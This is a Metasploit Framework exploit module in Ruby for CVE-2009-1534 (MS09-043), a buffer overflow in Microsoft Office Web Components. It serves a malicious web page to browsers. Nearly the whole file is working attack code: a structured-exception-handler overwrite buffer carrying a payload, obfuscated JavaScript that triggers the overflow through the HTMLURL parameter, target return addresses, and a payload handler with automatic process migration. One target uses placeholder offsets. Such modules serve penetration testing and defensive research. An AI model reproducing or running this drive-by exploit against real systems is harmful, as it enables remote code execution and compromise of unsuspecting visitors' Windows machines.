##
# $Id: ms09_043_owc_htmlurl.rb 8698 2010-03-03 18:12:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft OWC Spreadsheet HTMLURL Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Microsoft's Office Web Components.
				When passing an overly long string as the "HTMLURL" parameter an attacker can 
				execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'jduck' ],
			'Version'        => '$Revision: 8698 $',
			'References'     =>
				[
					[ 'CVE', '2009-1534' ],
					[ 'OSVDB', '56916' ],
					[ 'BID', '35992' ],
					[ 'MSB', 'MS09-043' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=819' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\xf0",
					'DisableNops'   => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# 'ProgId' => "OWC.Spreadsheet.9"
					# 'ClassId' => "0002E512-0000-0000-C000-000000000046",
					
					[ 'Windows XP SP3 - IE6 - Office XP SP0',
						{
							'ClassId' => "0002E510-0000-0000-C000-000000000046",
							'Offset'  => 31337,
							'Ret'     => 0x42424242 # p/p/r in msohev.dll ??
						}
					],

					[ 'Windows XP SP3 - IE6 - Office XP SP3',
						{
							'ClassId' => "0002E511-0000-0000-C000-000000000046",
							'Offset'  => ((4096*7) + 1076),
							'Ret'     => 0x32521239 # p/p/r in msohev.dll 10.0.2609.0
						}
					]
				],
			'DisclosureDate' => 'Aug 11 2009',
			'DefaultTarget'  => 1))

			register_options(
				[
					OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
				], self.class)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def big_alnum(num)
		divisor = 2048 + rand(2048)
		pad_pages = num / divisor
		pad_left = num % divisor

		ret = ''
		ret << rand_text_alphanumeric(divisor) * pad_pages if pad_pages
		ret << rand_text_alphanumeric(pad_left) if pad_left
		ret
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# ActiveX parameter(s)
		clsid = target['ClassId']

		# Exploitation parameter(s)
		seh_offset = target['Offset']

		# Build the buffer.
		string = big_alnum(seh_offset)
		string << generate_seh_record(target.ret)
		string << payload.encoded
		string << big_alnum(40960 - string.length)
		string = Rex::Text.to_unescape(string)

		objid = rand_text_alphanumeric(8+rand(8))
		fnname = rand_text_alphanumeric(8+rand(8))

		# Build the final JavaScript
		js = "function #{fnname}() { var long = unescape('#{string}'); #{objid}.HTMLURL = long; }"

		# Obfuscate the javascript
		opts = {
			'Strings' => false, # way too slow to obfuscate this monster
			'Symbols' => {
				'Variables' => %w{ long }
			}
		}
		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.obfuscate()

		# Build the final HTML
		content = %Q|<html>
<head>
<script language=javascript>
#{js}
</script>
</head>
<body onload="history.go(0); #{fnname}()">
<object classid="clsid:#{clsid}" id="#{objid}">
</object>
</body>
</html>
|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content,
			{
				'Last-Modified' => 'Tue, 11 Aug 2009 07:13:46 GMT',
			})

		# Handle the payload
		handler(cli)
	end

end
